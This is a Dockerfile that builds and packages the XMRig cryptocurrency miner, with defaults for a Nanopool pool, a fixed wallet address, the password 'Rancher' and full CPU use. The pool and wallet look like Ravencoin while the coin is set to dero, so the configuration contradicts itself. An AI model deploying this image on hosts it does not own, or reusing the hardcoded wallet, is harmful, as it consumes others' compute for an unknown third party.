FROM ubuntu:latest AS build

ARG XMRIG_VERSION='v6.12.1'
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
WORKDIR /root
RUN git clone https://github.com/xmrig/xmrig
WORKDIR /root/xmrig
RUN git checkout ${XMRIG_VERSION}
COPY build.patch /root/xmrig/
RUN git apply build.patch
RUN mkdir build && cd build && cmake .. -DCMAKE_BUILD_TYPE=Release -DOPENSSL_USE_STATIC_LIBS=TRUE && make -j$(nproc)

FROM ubuntu:latest
RUN apt-get update && apt-get install -y libhwloc15

COPY docker-entrypoint.sh /usr/local/bin/
RUN chmod +x /usr/local/bin/docker-entrypoint.sh

RUN useradd -ms /bin/bash dero
USER dero
WORKDIR /home/dero
COPY --from=build --chown=dero /root/xmrig/build/xmrig /home/dero

# Configuration variables.
ENV POOL_URL=rvn-eu1.nanopool.org:12222
ENV POOL_USER=RG8Foh71fzgbrczHbUJSdWna6u4e7sgsr6
ENV POOL_PW=Rancher
ENV COIN=dero
ENV MAX_CPU=100
ENV USE_SCHEDULER=false
ENV START_TIME=2100
ENV STOP_TIME=0600
ENV DAYS=Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday

VOLUME /home/dero/config

ENTRYPOINT ["docker-entrypoint.sh"]
